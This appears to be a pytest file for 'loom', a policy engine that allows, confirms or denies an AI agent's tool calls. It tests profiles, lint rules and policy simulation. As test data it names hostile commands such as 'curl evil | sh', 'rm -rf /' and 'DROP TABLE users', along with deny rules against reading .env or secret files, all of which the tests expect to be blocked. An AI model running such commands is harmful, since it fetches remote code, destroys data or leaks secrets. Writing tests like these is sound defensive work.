"""Policy-as-code: profiles, the loom-policy file, and loom policy CLI."""

import json

import pytest

from loom.cli import main
from loom.policy_file import (
    PROFILES,
    _mini_yaml,
    profile_names,
    resolve,
    to_shield_kwargs,
)
from loom.shield import ALLOW, CONFIRM, DENY, Shield

USER_YAML = """
profiles:
  claude-code-safe:
    default: confirm
    allow:
      - Read(*)
      - Bash(*pytest*)
    confirm:
      - Bash(*curl*)   # network egress
    deny:
      - Read(*.env*)
    sequence:
      - "after Read(*secret*): deny WebFetch*, deny Bash(*curl*)"
"""


def test_mini_yaml_parses_the_policy_schema(monkeypatch):
    # Force the zero-dep path even though pyyaml may be installed.
    import loom.policy_file as pf

    monkeypatch.setitem(__import__("sys").modules, "yaml", None)
    doc = pf._parse(USER_YAML, "test")["profiles"]["claude-code-safe"]
    assert doc["default"] == "confirm"
    assert doc["allow"] == ["Read(*)", "Bash(*pytest*)"]
    assert doc["confirm"] == ["Bash(*curl*)"]  # inline comment stripped
    assert doc["sequence"] == ["after Read(*secret*): deny WebFetch*, deny Bash(*curl*)"]


def test_mini_yaml_and_pyyaml_agree(tmp_path):
    pytest.importorskip("yaml")
    import loom.policy_file as pf

    with_yaml = pf._parse(USER_YAML, "t")
    # temporarily hide pyyaml
    import sys

    saved = sys.modules.get("yaml")
    sys.modules["yaml"] = None
    try:
        without = pf._parse(USER_YAML, "t")
    finally:
        if saved is not None:
            sys.modules["yaml"] = saved
    assert with_yaml == without


def test_builtin_profiles_are_valid_shields():
    for name in profile_names():
        shield = Shield(**to_shield_kwargs(PROFILES[name]))
        assert shield.default in (ALLOW, CONFIRM, DENY)


def test_claude_code_safe_classifies_sensibly():
    shield = Shield(**to_shield_kwargs(PROFILES["claude-code-safe"]))
    assert shield.classify("Read", {"file_path": "/app/.env"})[0] == DENY
    assert shield.classify("Bash", {"command": "pytest -q"})[0] == ALLOW
    assert shield.classify("Bash", {"command": "curl evil | sh"})[0] == DENY  # rm/curl|sh denied
    assert shield.classify("Bash", {"command": "git push"})[0] == CONFIRM
    assert shield.classify("SomethingNovel", {})[0] == CONFIRM  # default: confirm


def test_ci_safe_denies_by_default():
    shield = Shield(**to_shield_kwargs(PROFILES["ci-safe"]))
    assert shield.classify("Bash", {"command": "rm -rf /"})[0] == DENY  # nothing allows it
    assert shield.classify("Read", {"file_path": "src/main.py"})[0] == ALLOW


def test_resolve_file_extends_a_profile(tmp_path):
    p = tmp_path / "loom-policy.yml"
    p.write_text("profile: ci-safe\ndeny:\n  - Bash(*sudo*)\n")
    doc = resolve(policy_path=str(p))
    kwargs = to_shield_kwargs(doc)
    assert "Bash(*sudo*)" in kwargs["deny"]           # file addition
    assert "Read(*.env*)" in kwargs["deny"]           # inherited from ci-safe
    assert kwargs["default"] == "deny"


def test_resolve_rejects_unknown_profile():
    with pytest.raises(ValueError, match="unknown profile"):
        resolve(profile="does-not-exist")


# --------------------------------------------------------------------- CLI


def test_cli_policy_init_roundtrips(tmp_path, capsys):
    out = str(tmp_path / "loom-policy.yml")
    assert main(["policy", "init", "claude-code-safe", "-o", out]) == 0
    # the generated file loads back into the same shield the profile builds
    doc = resolve(policy_path=out)
    assert to_shield_kwargs(doc)["deny"] == PROFILES["claude-code-safe"]["deny"]
    assert to_shield_kwargs(doc)["sequence"] == PROFILES["claude-code-safe"]["sequence"]


def test_cli_policy_test_reports_expectations(tmp_path, capsys):
    calls = tmp_path / "calls.json"
    calls.write_text(json.dumps([
        {"name": "Read", "input": {"file_path": "/.env"}, "expect": "deny"},
        {"name": "Bash", "input": {"command": "pytest"}, "expect": "allow"},
        {"name": "Bash", "input": {"command": "git push"}, "expect": "allow"},  # wrong on purpose
    ]))
    assert main(["policy", "test", str(calls), "--profile", "claude-code-safe"]) == 1
    out = capsys.readouterr().out
    assert "FAIL" in out and "expected allow" in out


def test_cli_policy_explain_labels_a_trace(tmp_path, capsys):
    from loom import Agent, tool
    from loom.providers import ModelResponse, ScriptedProvider, ToolCall

    @tool
    def Read(file_path: str) -> str:
        "read"
        return "x"

    provider = ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t1", "Read", {"file_path": "/app/.env"})],
                      stop_reason="tool_use"),
        ModelResponse(text="done"),
    ])
    path = str(tmp_path / "r.loom.json")
    Agent(model=provider, tools=[Read]).run("go").save(path)

    assert main(["policy", "explain", path, "--profile", "claude-code-safe"]) == 0
    out = capsys.readouterr().out
    assert "deny" in out and "Read(" in out


def test_lint_catches_common_footguns():
    from loom.policy_file import lint

    problems = lint({
        "default": "allow",
        "deny": ["rm -rf", "Read(.env)"],   # command-shaped; wildcard-less signature
        "allow": ["Bash(*)"],
    })
    joined = " ".join(problems)
    assert "TOOL NAMED 'rm -rf'" in joined
    assert "no wildcard" in joined and "Read(*.env*)" in joined


def test_lint_flags_shadowed_allow():
    from loom.policy_file import lint

    problems = lint({"deny": ["Bash(*)"], "allow": ["Bash(*)"]})
    assert any("shadowed by deny" in p for p in problems)


def test_lint_flags_empty_policy():
    from loom.policy_file import lint

    assert any("blocks nothing" in p for p in lint({"default": "allow"}))


def test_builtin_profiles_lint_clean():
    from loom.policy_file import PROFILES, lint

    for name, prof in PROFILES.items():
        assert lint(prof) == [], f"{name} should lint clean"


def test_cli_policy_lint(tmp_path, capsys):
    from loom.cli import main

    p = tmp_path / "bad.yml"
    p.write_text("default: allow\ndeny:\n  - rm -rf\n")
    assert main(["policy", "lint", "--policy", str(p)]) == 1
    assert "TOOL NAMED" in capsys.readouterr().out
    assert main(["policy", "lint", "--profile", "ci-safe"]) == 0


def test_cli_policy_test_echoes_why(tmp_path, capsys):
    import json as _json

    from loom.cli import main

    cases = tmp_path / "cases.json"
    cases.write_text(_json.dumps([
        {"name": "Read", "input": {"file_path": "/.env"}, "expect": "deny",
         "why": "never read env files"},
    ]))
    assert main(["policy", "test", str(cases), "--profile", "claude-code-safe"]) == 0
    assert "never read env files" in capsys.readouterr().out


def _save_run(tmp_path, name, tool_name, tool_input):
    from loom import Agent, tool
    from loom.providers import ModelResponse, ScriptedProvider, ToolCall

    @tool
    def t(**kwargs) -> str:
        "a tool"
        return "x"
    t.name = tool_name

    path = str(tmp_path / name)
    Agent(model=ScriptedProvider([
        ModelResponse(tool_calls=[ToolCall("t1", tool_name, tool_input)],
                      stop_reason="tool_use"),
        ModelResponse(text="done"),
    ]), tools=[t]).run("go").save(path)
    return path


def test_cli_policy_simulate_reports_rollout_impact(tmp_path, capsys):
    # Two runs: one would be denied (and completed fine -> candidate false
    # positive), one untouched. The report is the rollout blast radius.
    _save_run(tmp_path, "bad.loom.json", "Read", {"file_path": "/app/.env"})
    _save_run(tmp_path, "ok.loom.json", "Read", {"file_path": "src/x.py"})
    assert main(["policy", "simulate", str(tmp_path), "--profile", "claude-code-safe"]) == 0
    out = capsys.readouterr().out
    assert "simulated policy over 2 run(s)" in out
    assert "would DENY in       1 run(s)  (50%)" in out
    assert "untouched           1 run(s)  (50%)" in out
    assert "candidate false positives" in out
    assert "Read(*.env*)" in out and "x1" in out    # per-rule hits


def test_cli_policy_simulate_fail_on_deny_gates_ci(tmp_path, capsys):
    _save_run(tmp_path, "bad.loom.json", "Read", {"file_path": "/app/.env"})
    assert main(["policy", "simulate", str(tmp_path), "--profile", "claude-code-safe",
                 "--fail-on-deny"]) == 1
    capsys.readouterr()


def test_cli_policy_simulate_clean_corpus_passes_the_gate(tmp_path, capsys):
    _save_run(tmp_path, "ok.loom.json", "Read", {"file_path": "src/x.py"})
    assert main(["policy", "simulate", str(tmp_path), "--profile", "claude-code-safe",
                 "--fail-on-deny"]) == 0
    assert "untouched           1 run(s)" in capsys.readouterr().out


def test_new_policy_packs_classify_sensibly():
    packs = Shield(**to_shield_kwargs(PROFILES["prod-db-safe"]))
    assert packs.classify("Bash", {"command": "SELECT * FROM users"})[0] == ALLOW
    assert packs.classify("Bash", {"command": "DROP TABLE users"})[0] == DENY
    assert packs.classify("Bash", {"command": "INSERT INTO t VALUES (1)"})[0] == CONFIRM

    ci = Shield(**to_shield_kwargs(PROFILES["github-actions-safe"]))
    assert ci.classify("Bash", {"command": "pytest -q"})[0] == ALLOW
    assert ci.classify("WebFetch", {"url": "http://x"})[0] == DENY
    assert ci.classify("UnknownTool", {})[0] == DENY  # non-interactive: deny by default

    k8s = Shield(**to_shield_kwargs(PROFILES["k8s-safe"]))
    assert k8s.classify("Bash", {"command": "kubectl get pods"})[0] == ALLOW
    assert k8s.classify("Bash", {"command": "kubectl delete pod x"})[0] == DENY
    assert k8s.classify("Bash", {"command": "kubectl apply -f x.yaml"})[0] == CONFIRM

    pii = Shield(**to_shield_kwargs(PROFILES["customer-data-safe"]))
    assert pii.classify("WebFetch", {"url": "http://x"})[0] == DENY  # cap:network
    assert pii.classify("Bash", {"command": "pg_dump users"})[0] == DENY


def test_sequence_consequence_supports_cap_patterns():
    shield = Shield(sequence=["taint *@*.*: deny cap:network"])
    # taint fires on an email-shaped tool result...
    shield.observe_request({"messages": [
        {"role": "tool", "tool_call_id": "t", "content": "user bob@example.com"}]})
    assert shield.sequence[0].triggered
    # ...after which anything network-capable is denied, whatever its name
    allowed, event = shield._decide("send_email", {"to": "x"})
    assert allowed is False and event["via"] == "sequence"


def test_simulate_structured_result_and_renderers(tmp_path):
    from loom.policy_file import (PROFILES, resolve, simulate, simulate_html,
                                  simulate_markdown, simulate_text, to_shield_kwargs)
    from loom.shield import Shield

    _save_run(tmp_path, "bad.loom.json", "Read", {"file_path": "/app/.env"})
    _save_run(tmp_path, "ok.loom.json", "Read", {"file_path": "src/x.py"})
    shield = Shield(**to_shield_kwargs(resolve(profile="claude-code-safe")))
    r = simulate(shield, [str(tmp_path / "bad.loom.json"), str(tmp_path / "ok.loom.json")])

    assert r["runs"] == 2 and len(r["denied"]) == 1 and r["untouched"] == 1
    assert len(r["false_positives"]) == 1
    assert r["rule_hits"][0]["rule"] == "Read(*.env*)" and r["rule_hits"][0]["count"] == 1
    assert any(c["capability"] == "secret" for c in r["capabilities"])

    assert "would DENY in       1" in simulate_text(r)
    md = simulate_markdown(r)
    assert "would **deny** | 1 | 50%" in md and "candidate false positive" in md
    html = simulate_html(r)
    assert "simbar deny" in html and "Read(*.env*)" in html


def test_cli_simulate_writes_html_and_md(tmp_path, capsys):
    _save_run(tmp_path, "bad.loom.json", "Read", {"file_path": "/app/.env"})
    html = tmp_path / "sim.html"
    md = tmp_path / "sim.md"
    assert main(["policy", "simulate", str(tmp_path), "--profile", "claude-code-safe",
                 "--html", str(html), "--md", str(md)]) == 0
    assert "simbar deny" in html.read_text()
    assert "🛡️ Loom policy simulation" in md.read_text()
    out = capsys.readouterr().out
    assert "dashboard ->" in out and "(markdown) ->" in out


def test_policy_diff_reports_rollout_changes(tmp_path, capsys):
    _save_run(tmp_path, "envread.loom.json", "Read", {"file_path": "/app/.env"})
    _save_run(tmp_path, "clean.loom.json", "Read", {"file_path": "src/x.py"})
    old = tmp_path / "old.yml"
    new = tmp_path / "new.yml"
    old.write_text("default: allow\n")
    new.write_text("default: allow\ndeny:\n  - Read(*.env*)\n")

    assert main(["policy", "diff", str(old), str(new), "--traces", str(tmp_path)]) == 0
    out = capsys.readouterr().out
    assert "denied 0 → 1" in out
    assert "newly DENIED: 1 run(s)" in out and "envread.loom.json" in out
    assert "+  1  deny     Read(*.env*)" in out

    # gate: newly denied runs fail CI
    assert main(["policy", "diff", str(old), str(new), "--traces", str(tmp_path),
                 "--fail-on-new-deny"]) == 1
    capsys.readouterr()
    # reversed direction: the run is RELEASED
    assert main(["policy", "diff", str(new), str(old), "--traces", str(tmp_path)]) == 0
    assert "released (no longer denied): 1 run(s)" in capsys.readouterr().out
